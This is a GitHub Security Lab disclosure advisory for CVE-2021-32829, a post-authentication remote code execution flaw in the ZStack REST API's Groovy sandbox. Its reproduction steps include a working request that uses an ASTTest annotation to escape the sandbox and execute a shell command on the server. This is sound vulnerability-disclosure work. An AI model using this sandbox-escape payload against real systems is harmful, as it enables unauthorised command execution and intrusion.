<header class="post-header d-block mb-6">
      <div class="date text-mono f5 my-3">July 21, 2021</div>
      <h1 class="my-2 h00-mktg lh-condensed">GHSL-2021-065: Post-authentication Remote Code Execution (RCE) in ZStack REST API - CVE-2021-32829</h1>

      
      
      
      
      

      

      <a target="_blank" class="sc-frDJqD SgxRc d-inline-flex flex-row flex-items-center text-gray" href="https://github.com/pwntester">
        <img class="mr-3" src="https://avatars.githubusercontent.com/u/125701?s=35" height="35" width="35">
        <span>Alvaro Munoz</span>
      </a>
    </header>

    <main id="content" class="markdown-body" aria-label="Content">
      
<h2 id="coordinated-disclosure-timeline">Coordinated Disclosure Timeline</h2>
<ul>
  <li>2021-04-14: Reported via a GitHub Security Advisory</li>
  <li>2021-04-15: The issue is acknowledged</li>
  <li>2021-06-08: Issue is <a href="https://github.com/zstackio/zstack/security/advisories/GHSA-6xgq-7rqg-x3q5">fixed</a></li>
</ul>

<h2 id="summary">Summary</h2>
<p>ZStack REST API is vulnerable to post-authentication Remote Code Execution (RCE) via bypass of the Groovy shell sandbox</p>

<h2 id="product">Product</h2>
<p>ZStack (https://en.zstack.io/)</p>

<h2 id="tested-version">Tested Version</h2>
<p>3.10.7-c76 (ZStack-x86_64-DVD-3.10.7-c76.iso)</p>

<h2 id="details">Details</h2>

<h3 id="arbitrary-groovy-script-evaluation-ghsl-2021-065">Arbitrary Groovy Script evaluation (GHSL-2021-065)</h3>
<p>The <a href="https://en.zstack.io/help/en/dev_manual/dev_guide/v3/">REST API</a> exposes the <code class="language-plaintext highlighter-rouge">GET zstack/v1/batch-queries?script</code> endpoint which is backed up by the <a href="https://github.com/zstackio/zstack/blob/master/sdk/src/main/java/org/zstack/sdk/BatchQueryAction.java">BatchQueryAction</a> class. Messages are represented by the <a href="https://github.com/zstackio/zstack/blob/master/search/src/main/java/org/zstack/query/APIBatchQueryMsg.java">APIBatchQueryMsg</a>, dispatched to the <a href="https://github.com/zstackio/zstack/blob/master/search/src/main/java/org/zstack/query/QueryFacadeImpl.java">QueryFacadeImpl</a> facade and handled by the <a href="https://github.com/zstackio/zstack/blob/master/search/src/main/java/org/zstack/query/BatchQuery.groovy">BatchQuery</a> class.</p>

<p>The HTTP request parameter <code class="language-plaintext highlighter-rouge">script</code> is mapped to the <code class="language-plaintext highlighter-rouge">APIBatchQueryMsg.script</code> property and evaluated as a Groovy script in <a href="https://github.com/zstackio/zstack/blob/master/search/src/main/java/org/zstack/query/BatchQuery.groovy#L436"><code class="language-plaintext highlighter-rouge">BatchQuery.query</code></a></p>

<div class="language-groovy highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Map</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span> <span class="n">Object</span><span class="o">&gt;</span> <span class="n">query</span><span class="o">(</span><span class="n">APIBatchQueryMsg</span> <span class="n">msg</span><span class="o">)</span> <span class="o">{</span>

  <span class="o">...</span>
  <span class="kt">def</span> <span class="n">cc</span> <span class="o">=</span> <span class="k">new</span> <span class="n">CompilerConfiguration</span><span class="o">()</span>
  <span class="n">cc</span><span class="o">.</span><span class="na">addCompilationCustomizers</span><span class="o">(</span><span class="k">new</span> <span class="n">SandboxTransformer</span><span class="o">())</span>

  <span class="kt">def</span> <span class="n">shell</span> <span class="o">=</span> <span class="k">new</span> <span class="n">GroovyShell</span><span class="o">(</span><span class="k">new</span> <span class="n">GroovyClassLoader</span><span class="o">(),</span> <span class="n">binding</span><span class="o">,</span> <span class="n">cc</span><span class="o">)</span>
  <span class="n">sandbox</span><span class="o">.</span><span class="na">register</span><span class="o">()</span>
  <span class="k">try</span> <span class="o">{</span>
      <span class="n">Script</span> <span class="n">script</span> <span class="o">=</span> <span class="n">shell</span><span class="o">.</span><span class="na">parse</span><span class="o">(</span><span class="n">msg</span><span class="o">.</span><span class="na">script</span><span class="o">)</span>
      <span class="n">ZQLContext</span><span class="o">.</span><span class="na">putAPISession</span><span class="o">(</span><span class="n">msg</span><span class="o">.</span><span class="na">session</span><span class="o">)</span>
      <span class="n">script</span><span class="o">.</span><span class="na">run</span><span class="o">()</span>
      <span class="n">ZQLContext</span><span class="o">.</span><span class="na">clean</span><span class="o">()</span>
      <span class="n">clearAllClassInfo</span><span class="o">(</span><span class="n">script</span><span class="o">.</span><span class="na">getClass</span><span class="o">())</span>
  <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Throwable</span> <span class="n">t</span><span class="o">)</span> <span class="o">{</span>
      <span class="n">logger</span><span class="o">.</span><span class="na">warn</span><span class="o">(</span><span class="n">t</span><span class="o">.</span><span class="na">message</span><span class="o">,</span> <span class="n">t</span><span class="o">)</span>
      <span class="n">sandbox</span><span class="o">.</span><span class="na">unregister</span><span class="o">()</span>
      <span class="k">throw</span> <span class="k">new</span> <span class="nf">OperationFailureException</span><span class="o">(</span><span class="n">Platform</span><span class="o">.</span><span class="na">operr</span><span class="o">(</span><span class="s2">"${errorLine(msg.script, t)}"</span><span class="o">))</span>
  <span class="o">}</span> <span class="k">finally</span> <span class="o">{</span>
      <span class="n">sandbox</span><span class="o">.</span><span class="na">unregister</span><span class="o">()</span>
      <span class="n">shell</span><span class="o">.</span><span class="na">resetLoadedClasses</span><span class="o">()</span>
  <span class="o">}</span>
  <span class="o">...</span>
    
<span class="o">}</span>
</code></pre></div></div>

<p>As we can see in the code snippet above, the evaluation of the user-controlled Groovy script is sandboxed by <code class="language-plaintext highlighter-rouge">SandboxTransformer</code> which will apply the restrictions defined in the registered (<code class="language-plaintext highlighter-rouge">sandbox.register()</code>) <code class="language-plaintext highlighter-rouge">GroovyInterceptor</code>. This interceptor is declared in the <a href="https://github.com/zstackio/zstack/blob/master/search/src/main/java/org/zstack/query/BatchQuery.groovy#L62"><code class="language-plaintext highlighter-rouge">Sandbox</code></a> class as:</p>

<div class="language-groovy highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="kd">static</span> <span class="kd">class</span> <span class="nc">SandBox</span> <span class="kd">extends</span> <span class="n">GroovyInterceptor</span> <span class="o">{</span>
        <span class="kd">static</span> <span class="n">List</span><span class="o">&lt;</span><span class="n">Class</span><span class="o">&gt;</span> <span class="n">RECEIVER_WHITE_LIST</span> <span class="o">=</span> <span class="o">[</span>
                <span class="n">Number</span><span class="o">[].</span><span class="na">class</span><span class="o">,</span>
                <span class="n">Number</span><span class="o">.</span><span class="na">class</span><span class="o">,</span>
                <span class="kt">long</span><span class="o">[].</span><span class="na">class</span><span class="o">,</span>
                <span class="kt">long</span><span class="o">.</span><span class="na">class</span><span class="o">,</span>
                <span class="kt">int</span><span class="o">[].</span><span class="na">class</span><span class="o">,</span>
                <span class="kt">int</span><span class="o">.</span><span class="na">class</span><span class="o">,</span>
                <span class="kt">short</span><span class="o">[].</span><span class="na">class</span><span class="o">,</span>
                <span class="kt">short</span><span class="o">.</span><span class="na">class</span><span class="o">,</span>
                <span class="kt">double</span><span class="o">[].</span><span class="na">class</span><span class="o">,</span>
                <span class="kt">double</span><span class="o">.</span><span class="na">class</span><span class="o">,</span>
                <span class="kt">float</span><span class="o">[].</span><span class="na">class</span><span class="o">,</span>
                <span class="kt">float</span><span class="o">.</span><span class="na">class</span><span class="o">,</span>
                <span class="n">String</span><span class="o">[].</span><span class="na">class</span><span class="o">,</span>
                <span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">,</span>
                <span class="n">Date</span><span class="o">[].</span><span class="na">class</span><span class="o">,</span>
                <span class="n">Date</span><span class="o">.</span><span class="na">class</span><span class="o">,</span>
                <span class="n">Map</span><span class="o">.</span><span class="na">class</span><span class="o">,</span>
                <span class="n">Collection</span><span class="o">.</span><span class="na">class</span><span class="o">,</span>
                <span class="n">Script</span><span class="o">.</span><span class="na">class</span><span class="o">,</span>
                <span class="n">Enum</span><span class="o">[].</span><span class="na">class</span><span class="o">,</span>
                <span class="n">Enum</span><span class="o">.</span><span class="na">class</span>
        <span class="o">]</span>

        <span class="kd">static</span> <span class="kt">void</span> <span class="nf">checkReceiver</span><span class="o">(</span><span class="n">Object</span> <span class="n">obj</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">checkReceiver</span><span class="o">(</span><span class="n">obj</span><span class="o">.</span><span class="na">getClass</span><span class="o">())</span>
        <span class="o">}</span>

        <span class="kd">static</span> <span class="kt">void</span> <span class="nf">checkReceiver</span><span class="o">(</span><span class="n">Class</span> <span class="n">clz</span><span class="o">)</span> <span class="o">{</span>
            <span class="k">for</span> <span class="o">(</span><span class="n">Class</span> <span class="n">wclz</span> <span class="o">:</span> <span class="n">RECEIVER_WHITE_LIST</span><span class="o">)</span> <span class="o">{</span>
                <span class="k">if</span> <span class="o">(</span><span class="n">wclz</span><span class="o">.</span><span class="na">isAssignableFrom</span><span class="o">(</span><span class="n">clz</span><span class="o">))</span> <span class="o">{</span>
                    <span class="k">return</span>
                <span class="o">}</span>
            <span class="o">}</span>

            <span class="k">throw</span> <span class="k">new</span> <span class="nf">Exception</span><span class="o">(</span><span class="s2">"invalid operation on class[${clz.name}]"</span><span class="o">)</span>
        <span class="o">}</span>

        <span class="kd">static</span> <span class="kt">void</span> <span class="nf">checkMethod</span><span class="o">(</span><span class="n">String</span> <span class="n">method</span><span class="o">)</span> <span class="o">{</span>
            <span class="k">if</span> <span class="o">(</span><span class="n">method</span> <span class="o">==</span> <span class="s2">"sleep"</span><span class="o">)</span> <span class="o">{</span>
                <span class="k">throw</span> <span class="k">new</span> <span class="nf">Exception</span><span class="o">(</span><span class="s2">"invalid operation[${method}]"</span><span class="o">)</span>
            <span class="o">}</span>
        <span class="o">}</span>

        <span class="n">Object</span> <span class="nf">onMethodCall</span><span class="o">(</span><span class="n">GroovyInterceptor</span><span class="o">.</span><span class="na">Invoker</span> <span class="n">invoker</span><span class="o">,</span> <span class="n">Object</span> <span class="n">receiver</span><span class="o">,</span> <span class="n">String</span> <span class="n">method</span><span class="o">,</span> <span class="n">Object</span><span class="o">...</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Throwable</span> <span class="o">{</span>
            <span class="n">checkReceiver</span><span class="o">(</span><span class="n">receiver</span><span class="o">)</span>
            <span class="n">checkMethod</span><span class="o">(</span><span class="n">method</span><span class="o">)</span>
            <span class="k">return</span> <span class="kd">super</span><span class="o">.</span><span class="na">onMethodCall</span><span class="o">(</span><span class="n">invoker</span><span class="o">,</span> <span class="n">receiver</span><span class="o">,</span> <span class="n">method</span><span class="o">,</span> <span class="n">args</span><span class="o">)</span>
        <span class="o">}</span>

        <span class="n">Object</span> <span class="nf">onStaticCall</span><span class="o">(</span><span class="n">GroovyInterceptor</span><span class="o">.</span><span class="na">Invoker</span> <span class="n">invoker</span><span class="o">,</span> <span class="n">Class</span> <span class="n">receiver</span><span class="o">,</span> <span class="n">String</span> <span class="n">method</span><span class="o">,</span> <span class="n">Object</span><span class="o">...</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Throwable</span> <span class="o">{</span>
            <span class="n">checkReceiver</span><span class="o">(</span><span class="n">receiver</span><span class="o">)</span>
            <span class="n">checkMethod</span><span class="o">(</span><span class="n">method</span><span class="o">)</span>
            <span class="k">return</span> <span class="kd">super</span><span class="o">.</span><span class="na">onStaticCall</span><span class="o">(</span><span class="n">invoker</span><span class="o">,</span> <span class="n">receiver</span><span class="o">,</span> <span class="n">method</span><span class="o">,</span> <span class="n">args</span><span class="o">)</span>
        <span class="o">}</span>

        <span class="n">Object</span> <span class="nf">onNewInstance</span><span class="o">(</span><span class="n">GroovyInterceptor</span><span class="o">.</span><span class="na">Invoker</span> <span class="n">invoker</span><span class="o">,</span> <span class="n">Class</span> <span class="n">receiver</span><span class="o">,</span> <span class="n">Object</span><span class="o">...</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Throwable</span> <span class="o">{</span>
            <span class="n">checkReceiver</span><span class="o">(</span><span class="n">receiver</span><span class="o">)</span>
            <span class="k">return</span> <span class="n">invoker</span><span class="o">.</span><span class="na">call</span><span class="o">(</span><span class="n">receiver</span><span class="o">,</span> <span class="o">(</span><span class="n">String</span><span class="o">)</span><span class="kc">null</span><span class="o">,</span> <span class="o">(</span><span class="n">Object</span><span class="o">[])</span><span class="n">args</span><span class="o">);</span>
        <span class="o">}</span>

        <span class="n">Object</span> <span class="nf">onSuperCall</span><span class="o">(</span><span class="n">GroovyInterceptor</span><span class="o">.</span><span class="na">Invoker</span> <span class="n">invoker</span><span class="o">,</span> <span class="n">Class</span> <span class="n">senderType</span><span class="o">,</span> <span class="n">Object</span> <span class="n">receiver</span><span class="o">,</span> <span class="n">String</span> <span class="n">method</span><span class="o">,</span> <span class="n">Object</span><span class="o">...</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Throwable</span> <span class="o">{</span>
            <span class="n">checkReceiver</span><span class="o">(</span><span class="n">receiver</span><span class="o">)</span>
            <span class="k">return</span> <span class="n">invoker</span><span class="o">.</span><span class="na">call</span><span class="o">(</span><span class="k">new</span> <span class="n">Super</span><span class="o">(</span><span class="n">senderType</span><span class="o">,</span> <span class="n">receiver</span><span class="o">),</span> <span class="n">method</span><span class="o">,</span> <span class="o">(</span><span class="n">Object</span><span class="o">[])</span><span class="n">args</span><span class="o">);</span>
        <span class="o">}</span>

        <span class="kt">void</span> <span class="nf">onSuperConstructor</span><span class="o">(</span><span class="n">GroovyInterceptor</span><span class="o">.</span><span class="na">Invoker</span> <span class="n">invoker</span><span class="o">,</span> <span class="n">Class</span> <span class="n">receiver</span><span class="o">,</span> <span class="n">Object</span><span class="o">...</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Throwable</span> <span class="o">{</span>
            <span class="n">checkReceiver</span><span class="o">(</span><span class="n">receiver</span><span class="o">)</span>
            <span class="k">this</span><span class="o">.</span><span class="na">onNewInstance</span><span class="o">(</span><span class="n">invoker</span><span class="o">,</span> <span class="n">receiver</span><span class="o">,</span> <span class="n">args</span><span class="o">);</span>
        <span class="o">}</span>

        <span class="n">Object</span> <span class="nf">onGetProperty</span><span class="o">(</span><span class="n">GroovyInterceptor</span><span class="o">.</span><span class="na">Invoker</span> <span class="n">invoker</span><span class="o">,</span> <span class="n">Object</span> <span class="n">receiver</span><span class="o">,</span> <span class="n">String</span> <span class="n">property</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Throwable</span> <span class="o">{</span>
            <span class="n">checkReceiver</span><span class="o">(</span><span class="n">receiver</span><span class="o">)</span>
            <span class="k">return</span> <span class="n">invoker</span><span class="o">.</span><span class="na">call</span><span class="o">(</span><span class="n">receiver</span><span class="o">,</span> <span class="n">property</span><span class="o">);</span>
        <span class="o">}</span>

        <span class="n">Object</span> <span class="nf">onSetProperty</span><span class="o">(</span><span class="n">GroovyInterceptor</span><span class="o">.</span><span class="na">Invoker</span> <span class="n">invoker</span><span class="o">,</span> <span class="n">Object</span> <span class="n">receiver</span><span class="o">,</span> <span class="n">String</span> <span class="n">property</span><span class="o">,</span> <span class="n">Object</span> <span class="n">value</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Throwable</span> <span class="o">{</span>
            <span class="n">checkReceiver</span><span class="o">(</span><span class="n">receiver</span><span class="o">)</span>
            <span class="k">return</span> <span class="n">invoker</span><span class="o">.</span><span class="na">call</span><span class="o">(</span><span class="n">receiver</span><span class="o">,</span> <span class="n">property</span><span class="o">,</span> <span class="n">value</span><span class="o">);</span>
        <span class="o">}</span>

        <span class="n">Object</span> <span class="nf">onGetAttribute</span><span class="o">(</span><span class="n">GroovyInterceptor</span><span class="o">.</span><span class="na">Invoker</span> <span class="n">invoker</span><span class="o">,</span> <span class="n">Object</span> <span class="n">receiver</span><span class="o">,</span> <span class="n">String</span> <span class="n">attribute</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Throwable</span> <span class="o">{</span>
            <span class="n">checkReceiver</span><span class="o">(</span><span class="n">receiver</span><span class="o">)</span>
            <span class="k">return</span> <span class="n">invoker</span><span class="o">.</span><span class="na">call</span><span class="o">(</span><span class="n">receiver</span><span class="o">,</span> <span class="n">attribute</span><span class="o">);</span>
        <span class="o">}</span>

        <span class="n">Object</span> <span class="nf">onSetAttribute</span><span class="o">(</span><span class="n">GroovyInterceptor</span><span class="o">.</span><span class="na">Invoker</span> <span class="n">invoker</span><span class="o">,</span> <span class="n">Object</span> <span class="n">receiver</span><span class="o">,</span> <span class="n">String</span> <span class="n">attribute</span><span class="o">,</span> <span class="n">Object</span> <span class="n">value</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Throwable</span> <span class="o">{</span>
            <span class="n">checkReceiver</span><span class="o">(</span><span class="n">receiver</span><span class="o">)</span>
            <span class="k">return</span> <span class="n">invoker</span><span class="o">.</span><span class="na">call</span><span class="o">(</span><span class="n">receiver</span><span class="o">,</span> <span class="n">attribute</span><span class="o">,</span> <span class="n">value</span><span class="o">);</span>
        <span class="o">}</span>

        <span class="n">Object</span> <span class="nf">onGetArray</span><span class="o">(</span><span class="n">GroovyInterceptor</span><span class="o">.</span><span class="na">Invoker</span> <span class="n">invoker</span><span class="o">,</span> <span class="n">Object</span> <span class="n">receiver</span><span class="o">,</span> <span class="n">Object</span> <span class="n">index</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Throwable</span> <span class="o">{</span>
            <span class="n">checkReceiver</span><span class="o">(</span><span class="n">receiver</span><span class="o">)</span>
            <span class="k">return</span> <span class="n">invoker</span><span class="o">.</span><span class="na">call</span><span class="o">(</span><span class="n">receiver</span><span class="o">,</span> <span class="o">(</span><span class="n">String</span><span class="o">)</span><span class="kc">null</span><span class="o">,</span> <span class="o">(</span><span class="n">Object</span><span class="o">)</span><span class="n">index</span><span class="o">);</span>
        <span class="o">}</span>

        <span class="n">Object</span> <span class="nf">onSetArray</span><span class="o">(</span><span class="n">GroovyInterceptor</span><span class="o">.</span><span class="na">Invoker</span> <span class="n">invoker</span><span class="o">,</span> <span class="n">Object</span> <span class="n">receiver</span><span class="o">,</span> <span class="n">Object</span> <span class="n">index</span><span class="o">,</span> <span class="n">Object</span> <span class="n">value</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Throwable</span> <span class="o">{</span>
            <span class="n">checkReceiver</span><span class="o">(</span><span class="n">receiver</span><span class="o">)</span>
            <span class="k">return</span> <span class="n">invoker</span><span class="o">.</span><span class="na">call</span><span class="o">(</span><span class="n">receiver</span><span class="o">,</span> <span class="o">(</span><span class="n">String</span><span class="o">)</span><span class="kc">null</span><span class="o">,</span> <span class="n">index</span><span class="o">,</span> <span class="n">value</span><span class="o">);</span>
        <span class="o">}</span>
    <span class="o">}</span>
</code></pre></div></div>

<p>Even though the sandbox heavily restricts the receiver types to a small set of allowed types, the sandbox is non effective at controlling any code placed in Java annotations and therefore vulnerable to meta-programming escapes as defined in this <a href="https://blog.orange.tw/2019/02/abusing-meta-programming-for-unauthenticated-rce.html">blog post</a>.</p>

<h4 id="impact">Impact</h4>
<p>This issue leads to post-authenticated remote code execution.</p>

<h4 id="resources">Resources</h4>
<p>Reproduction steps:</p>

<ol>
  <li>Authenticate as any non-privileged user or system admin
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PUT http://192.168.78.132:8080/zstack/v1/accounts/login
{
 "logInByAccount": {
     "password": "b109f3bbbc244eb82441917ed06d618b9008dd09b3befd1b5e07394c706a8bb980b1d7785e5976ec049b46df5f1326af5a2ea6d103fd07c95385ffab0cacbc86",
     "accountName": "admin"
 }
}
</code></pre></div>    </div>
  </li>
</ol>

<p>Response</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># {"inventory":{"uuid":"901c1c7c58534883a6cd3330104d0e18","accountUuid":"36c27e8ff05c4780bf6d2fa65700f22e","userUuid":"36c27e8ff05c4780bf6d2fa65700f22e","expiredDate":"Apr 8, 2021 9:36:15 PM","createDate":"Apr 8, 2021 7:36:15 PM","noSessionEvaluation":false}}
</code></pre></div></div>

<ol>
  <li>Send a PoC exploit which creates a <code class="language-plaintext highlighter-rouge">/tmp/pwned</code> file (does not require “SystemAdmin” account)</li>
</ol>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>GET http://192.168.78.132:8080/zstack/v1/batch-queries?script=@groovy.transform.ASTTest(value=%7Bassert%20java.lang.Runtime.getRuntime().exec(%22touch%20/tmp/pwned%22)%7D)%20def%20x
Authorization: OAuth e89f1e6f5b3c4031b44a8392acde19dc
</code></pre></div></div>

<p>Response</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>status code: 503
Set-Cookie: JSESSIONID=7E525CEEDD417C0627F1188E1A739984; Path=/zstack; HttpOnly
Content-Length: 472
Date: Thu, 08 Apr 2021 11:47:59 GMT
Connection: close

{"error":{"code":"SYS.1006","description":"An operation failed","details":"No signature of method: Script1.ssert() is applicable for argument types: (java.lang.UNIXProcess) values: [java.lang.UNIXProcess@4a856d2]\nPossible solutions: every(), grep(), use([Ljava.lang.Object;), every(groovy.lang.Closure), sleep(long), split(groovy.lang.Closure), error at line 0: @groovy.transform.ASTTest(value={assert java.lang.Runtime.getRuntime().exec(\"touch /tmp/pwned2\")}) def x"}}
</code></pre></div></div>

<p>Even though, we get an Internal Error response (503), the output of the error already hints us that the process was executed (<code class="language-plaintext highlighter-rouge">[java.lang.UNIXProcess@4a856d2]]</code>) and if we check the <code class="language-plaintext highlighter-rouge">/tmp</code> directory, a <code class="language-plaintext highlighter-rouge">pwned</code> file should have been created.</p>

<h2 id="cve">CVE</h2>

<ul>
  <li>CVE-2021-32829</li>
</ul>

<h2 id="resources-1">Resources</h2>
<ul>
  <li><a href="https://github.com/zstackio/zstack/security/advisories/GHSA-6xgq-7rqg-x3q5">https://github.com/zstackio/zstack/security/advisories/GHSA-6xgq-7rqg-x3q5</a></li>
</ul>

<h2 id="credit">Credit</h2>
<p>This issue was discovered and reported by GHSL team member <a href="https://github.com/pwntester">@pwntester (Alvaro Muñoz)</a>.</p>

<h2 id="contact">Contact</h2>
<p>You can contact the GHSL team at <code class="language-plaintext highlighter-rouge">securitylab@github.com</code>, please include a reference to <code class="language-plaintext highlighter-rouge">GHSL-2021-065</code> in any communication regarding this issue.</p>

